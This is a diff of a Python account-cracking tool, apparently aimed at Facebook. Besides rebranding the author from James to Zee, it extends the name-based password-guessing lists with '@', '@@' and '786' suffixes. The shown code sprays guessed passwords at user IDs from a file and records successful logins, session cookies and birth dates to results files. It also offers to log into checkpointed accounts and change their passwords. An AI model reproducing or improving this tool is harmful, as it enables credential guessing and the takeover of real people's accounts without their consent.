@@ -173,47 +173,48 @@ def loading():
     print("")
 # LOGO
 def logo():
-    print("""\n
-\033[1;92m    _          _
-\033[1;92m     \\        /
-\033[1;92m    __\\______/__
-\033[1;92m    | [\033[1;31;1m©\033[1;92m]  [\033[1;31;1m©\033[1;92m] |​
- \033[1;92m   |  [\33[1;33m====\033[1;92m]  | [+] HACKERS BANGLADESH [+]
-\033[1;92m╔══o00════════00o═════════════════════════╗
-\033[1;31;1m█ \033[1;92m [•] \033[1;31;1mAuthor    :  \033[1;92m James404_           \033[1;31;1m █
-\033[1;31;1m█ \033[1;92m [•] \033[1;31;1mWhatsapp  :  \033[1;92m Black Gold          \033[1;31;1m █
-\033[1;31;1m█ \033[1;92m [•] \033[1;31;1mWhatsapp  : \033[1;92m  Black404_           \033[1;31;1m █
-\033[1;31;1m█ \033[1;92m [•] \033[1;31;1mGorup Fb  :  \033[1;92m Termux Command World\033[1;31;1m █
-\033[1;31;1m█ \033[1;92m [•] \033[1;31;1mVersion   :  \033[1;92m 0.3                  \033[1;31;1m█
-\033[1;92m╚═════════════════════════════════════════╝""")
+    print("""
+\033[1;96m█████████
+\033[1;96m█▄█████▄█      \033[1;91m●▬▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬●
+\033[1;96m█\033[1;91m▼▼▼▼▼ \033[1;95m- _ --_--\033[1;95m╔╦╗┌─┐┬─┐┬┌─   ╔═╗╔╗ 
+\033[1;96m█ \033[1;92m \033[1;95m_-_-- -_ --__\033[1;94m ║║├─┤├┬┘├┴┐───╠╣ ╠╩╗v1.5
+\033[1;96m█\033[1;91m▲▲▲▲▲\033[1;95m--  - _ --\033[1;96m═╩╝┴ ┴┴└─┴ ┴   ╚  ╚═╝ \033[1;93mZee
+\033[1;96m█████████      \033[1;92m«----------✧----------»
+\033[1;96m ██ ██
+            \033[1;91m  \x1b[7m➺➺ Author: ZeDD ㋡㋡\x1b[0m
+\033[1;91m╔═══════════════════════\033[1;94m══════════════════════╗
+\033[1;93m║\033[1;93m* \033[1;97mAuthor  \033[1;91m: \033[1;33m[ZɘDD]                           \033[1;94m║
+\033[1;95m║\033[1;93m* \033[1;97mGitHub  \033[1;91m: \033[1;92m[https//:github.com/Em710]       \033[1;95m║
+\033[1;94m║\033[1;93m* \033[1;97mSupport \033[1;91m: \033[1;98m[Rʌɱzʌŋ] \033[1;95m[Gɱ & Aɗŋʌŋ] \033[1;96m[Hʌsɘɘɓ]   \033[1;93m║
+\033[1;94m╚═══════════════════════\033[1;91m══════════════════════╝""")
 #CRACK SELESAI
 def hasil(ok,cp):
     if len(ok) != 0 or len(cp) != 0:
-        print(f'\n%s══════════════════════════════════════════\n [%s✓%s] %sCracking By James Usercrack...\n%s══════════════════════════════════════════'%(N,H,N,H,N))
+        print(f'\n%s══════════════════════════════════════════\n [%s✓%s] %sCracking By Zee Usercrack...\n%s══════════════════════════════════════════'%(N,H,N,H,N))
         print(f' %s[%s+%s] Number of Accounts OK : %s%s%s'%(H,H,H,H,str(len(ok)),H))
         print(f' [%s+%s] Number of Accounts CP : %s%s%s'%(H,H,H,str(len(cp)),H))
         cek_cp = input(f"{H}══════════════════════════════════════════\n [{H}+{H}] Show CP detector options [{H}Y{N}/{M}t{N}]: ")
         if cek_cp =="":
             print(f"\n [{M}!{N}] Don't be empty");hasil(ok,cp)
         elif cek_cp in["Y","y"]:
-            jalan(f" {N}[{M}!{N}] Play airplanemode first");time.sleep(5)
-            ww=input(f"\n {N}[{K}?{N}] Change password when {BM}TAP YES{N} [{H}Y{N}/{M}t{N}]: ")
+            jalan(f" {N}[{M}!{N}] Play Airplanemode First");time.sleep(5)
+            ww=input(f"\n {N}[{K}?{N}] Change Password When {BM}TAP YES{N} [{H}Y{N}/{M}t{N}]: ")
             if ww in ("Y","y","ya"):
                 ubahP.append("y")
-                print(f" {N}[{H}•{N}] Password example : {H}james123{N}")
-                pwBar=input(f" {N}[{K}?{N}] Enter new password : {H}")
+                print(f" {N}[{H}•{N}] Password Example : {H}Zee123{N}")
+                pwBar=input(f" {N}[{K}?{N}] Enter New Password : {H}")
                 #print("\n")
                 if len(pwBar) <= 5:
-                    print('\n %s[%s×%s] Password minimum 6 characters'%(N,M,N))
+                    print('\n %s[%s×%s] Password Minimum 6 Characters'%(N,M,N))
                 else:
                     pwBaru.append(pwBar)
             for memek in cp:
                 kontol = memek.replace('\n', '')
                 titid  = kontol.split(' • ')
                 print(f'{N}══════════════════════════════════════════\n {H}LOGIN PROCESS')
-                jalan(f' {N}[{M}?{N}] Account : {K}{kontol.replace("[JAMES-CP] ", "")}{N}')
+                jalan(f' {N}[{M}?{N}] Account : {K}{kontol.replace("[Zee-CP] ", "")}{N}')
                 try:
-                    log_hasil(titid[0].replace("[JAMES-CP] ", ""), titid[1])
+                    log_hasil(titid[0].replace("[Zee-CP] ", ""), titid[1])
                 except requests.exceptions.ConnectionError:
                     continue
                     print("")
@@ -275,15 +276,15 @@ class __chigoue__:
     def chi(self, id):
         os.system("clear")
         logo()
-        crot = input(f" {H}[{H}+{H}] Want to show related apps [{H}y{H}/{H}t{H}]: ")
+        crot = input(f" {H}[{H}+{H}] Want To Show Related Apps [{H}y{H}/{H}t{H}]: ")
         if crot in[""]:
-            print(f" {N}[{M}×{N}] Don't be empty");__chigoue__().chi(id)
+            print(f" {N}[{M}×{N}] Don't Be Empty");__chigoue__().chi(id)
         elif crot in["Y","y"]:
             Apk.append("y")
         elif crot in["T","t"]:
             Apk.append("t")
         else:
-            #jalan(f" {N}[{M}×{N}] Sorry, wrong username");self.tampilkan_apk()
+            #jalan(f" {N}[{M}×{N}] Sorry, Wrong Username");self.tampilkan_apk()
             print(f" {H}[{H}×{H}] Select Between y/t");__chigoue__().chi(id)
         self.cnt = input('\033[1;92m[+] Enter File Name :\033[1;92m ')
         self.id = open(self.cnt).read().splitlines()
@@ -301,7 +302,7 @@ class __chigoue__:
 # PROSES CRACK METODE 3 in 1
     def __metode__(self, cebok, user, pasw):
         global ok,cp,loop
-        animasi = random.choice(["\x1b[1;92m[JAMES]","\x1b[1;92m[JAMES]","\x1b[1;92m[JAMES]","\x1b[1;92m[JAMES]","\x1b[1;92m[JAMES]","\x1b[1;92m[JAMES]","\x1b[1;92m[JAMES]"])
+        animasi = random.choice(["\x1b[1;92m[Zee]","\x1b[1;92m[Zee]","\x1b[1;92m[Zee]","\x1b[1;92m[Zee]","\x1b[1;92m[Zee]","\x1b[1;92m[Zee]","\x1b[1;92m[Zee]"])
         sys.stdout.write(f"\r {N}{animasi} {N}{loop}{N}/{M}{len(self.id)} {N}[{H}OK:{len(ok)}{N}][{K}CP:{len(cp)}{N}] [{H}{'{:.1%}'.format(loop/float(len(self.id)))}{N}]")
         sys.stdout.flush()
         try:
@@ -330,7 +331,7 @@ class __chigoue__:
                     elif "y" in Apk:
                         print(f'\r %sOK %s               \n Username : %s\n Password : %s%s'%(H,waktu,user,pw,N))
                         print(f'\r {H}Cookie   : {coki}')
-                    wrt = '[JAMES-OK] %s • %s' % (user,pw)
+                    wrt = '[Zee-OK] %s • %s' % (user,pw)
                     ok.append(wrt)
                     cek_apk(session,coki)
                     open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
@@ -342,7 +343,7 @@ class __chigoue__:
                         month, day, year = cp_ttl.split('/')
                         month = bulan_ttl[month]
                         print('\r %sCP %s               \n Username : %s\n Password : %s\n Tanggal Lahir : %s %s %s%s\n'%(K,waktu,user,pw,day,month,year,N))
-                        wrt = '[JAMES-CP] %s • %s • %s %s %s' % (user,pw,day,month,year)
+                        wrt = '[Zee-CP] %s • %s • %s %s %s' % (user,pw,day,month,year)
                         cp.append(wrt)
                         open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                         break
@@ -352,7 +353,7 @@ class __chigoue__:
                         year  = ''
                     except:pass
                     print('\r %sCP %s               \n Username : %s\n Password : %s%s\n'%(K,waktu,user,pw,N))
-                    wrt = '[JAMES-CP] %s • %s' % (user,pw)
+                    wrt = '[Zee-CP] %s • %s' % (user,pw)
                     cp.append(wrt)
                     open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                     break
@@ -403,9 +404,9 @@ class __chigoue__:
                        uid, name = yntkts.split('|')
                        xz = name.split(' ')
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
-                           pwx = [name, xz[0]+xz[1], xz[0]+"123"]
+                           pwx = [name, xz[0]+xz[1], xz[0]+"123", xz[0]+"@@", xz[0]+"@"]
                        else:
-                           pwx = [name, xz[0]+xz[1], xz[0]+"123"]
+                           pwx = [name, xz[0]+xz[1], xz[0]+"123", xz[0]+"@", xz[0]+"@@"]
                        kirim.submit(self.__metode__,url,uid,pwx)
                    except:pass
             hasil(ok,cp)
@@ -419,9 +420,9 @@ class __chigoue__:
                        uid, name = yntkts.split('|')
                        xz = name.split(' ')
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
-                           pwx = [name, xz[0]+"123", xz[0]+"1234", xz[0]+"12345", xz[0]+xz[1]]
+                           pwx = [name, xz[0]+"123", xz[0]+"1234", xz[0]+"12345", xz[0]+xz[1], xz[0]+"@@", xz[0]+"@"]
                        else:
-                           pwx = [name, xz[0]+"123", xz[0]+"1234", xz[0]+"12345", xz[0]+xz[1]]
+                           pwx = [name, xz[0]+"123", xz[0]+"1234", xz[0]+"12345", xz[0]+xz[1], xz[0]+"@", xz[0]+"@@"]
                        kirim.submit(self.__metode__,url,uid,pwx)
                    except:pass
             hasil(ok,cp)
@@ -440,10 +441,10 @@ class __chigoue__:
                        uid, name = yntkts.split('|')
                        xz = name.split(' ')
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
-                           xxx = [name, xz[0]+"123", xz[0]+"1234", xz[0]+"12345", xz[0]+xz[1]]
+                           xxx = [name, xz[0]+"123", xz[0]+"1234", xz[0]+"12345", xz[0]+xz[1], xz[0]+"786", xz[0]+"@", xz[0]+"@@"]
                            pwx = xxx + pw
                        else:
-                           xxx = [name, xz[0]+"123", xz[0]+"1234", xz[0]+"12345", xz[0]+xz[1]]
+                           xxx = [name, xz[0]+"123", xz[0]+"1234", xz[0]+"12345", xz[0]+xz[1], xz[0]+"786", xz[0]+"@@", xz[0]+"@"]
                            pwx = xxx + pw
                        kirim.submit(self.__metode__,url,uid,pwx)
                    except:pass
